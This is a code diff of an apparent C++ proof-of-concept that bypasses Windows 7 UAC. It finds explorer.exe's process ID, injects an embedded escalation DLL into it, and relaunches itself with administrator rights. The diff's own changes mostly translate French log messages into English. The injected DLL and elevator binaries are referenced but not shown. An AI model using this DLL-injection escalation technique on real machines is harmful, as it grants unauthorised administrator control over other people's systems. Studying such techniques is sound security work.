@@ -34,6 +34,7 @@ int main()
 		{
 			LOG.setHeader("FROM ELEVATED PROCESS");
 			LOG.addObserver(new Common::LogToNetwork("127.0.0.1", port));
+			LOG << "You are administrator, sending proof !";
 			LOG.sendRaw("ADMINISTRATOR");
 			return EXIT_SUCCESS;
 		}
@@ -42,7 +43,7 @@ int main()
 			LOG.setHeader("TEST ELEVATION");
 			LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
 			LOG.addObserver(new Common::LogToConsole);
-			LOG << "Vous n'etes pas administrateur !";
+			LOG << "You're not administrator !";
 			logServer.start();
 		}
 
@@ -51,14 +52,14 @@ int main()
 		    case OS_WIN32_WINDOWS_VISTA:
 			    if(isUacActivated())
 			    {
-					LOG << "Elevation non supportee sur Windows Vista.";
+					LOG << "Privilege escalation is not supported on Windows Vista";
 					return EXIT_FAILURE;
 			    }
 			    break;
 		    case OS_WIN32_WINDOWS_SEVEN:
 			    if(isUacActivated())
 			    {
-					LOG << "Tentative d'escalade des privileges...";
+					LOG << "Trying privilege escalation";
 					BinaryRessource * elevatorDll = 0;
 					BinaryRessource * elevator = 0;
 					if(is64BitWindows())
@@ -74,25 +75,25 @@ int main()
 						elevator = new BinaryRessource(Elevator32, sizeof(Elevator32), ELEVATOR_EXE_NAME, true);
 					}
 
-					LOG << "Decouverte du PID d'explorer.exe";
+					LOG << "What is explorer.exe PID ?";
 					DWORD explorer_pid = System::ProcessManager::GetPidFromName(ELEVATOR_PROCESS_NAME);
 					if(explorer_pid)
 					{
-						LOG << "Injection de la DLL d'elevation dans explorer.exe : " + to_string(explorer_pid);
+						LOG << "Injecting escalaion DLL in explorer.exe : " + to_string(explorer_pid);
 					}
 					else
 					{
-						FATAL_ERROR("explorer.exe ne peut pas etre injecte. Le processus n'existe pas.");
+						FATAL_ERROR("Process explorer.exe does not exist");
 					}
     					
                     ThisProcess thisProcess;
                     string currentPath = thisProcess.getProgramDir();
-					LOG << "Repertoire courant : "+currentPath;
+					LOG << "Current dir : "+currentPath;
                     string elevatorArguments = currentPath+"\\"+string(ELEVATOR_PROCESS_NAME) + " " + to_string(explorer_pid) + " " + currentPath+"\\"+string(ELEVATOR_DLL_NAME) + " " + thisProcess.getProgramPath();
-					LOG << "Ligne de commande d'elevation " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
+					LOG << "Escalation command line : " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
     					
 					Process elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
-					LOG << "Waiting elevator to finish...";
+					LOG << "Waiting elevator to finish";
 					DWORD exitCode = elevatorProcess.wait();					
 
 					delete elevatorDll;
@@ -100,7 +101,7 @@ int main()
 			    }
 				break;
 			default:
-				LOG << "Systeme non pris en charge...";
+				LOG << "Operating system not supported";
 				return EXIT_FAILURE;
         }
 		logServer.stop();
@@ -112,7 +113,7 @@ int main()
     }
     catch(std::exception& e)
     {
-        LOG << "Exception standard : " + to_string(e.what());
+        LOG << e.what();
     }
 	catch(...)
 	{
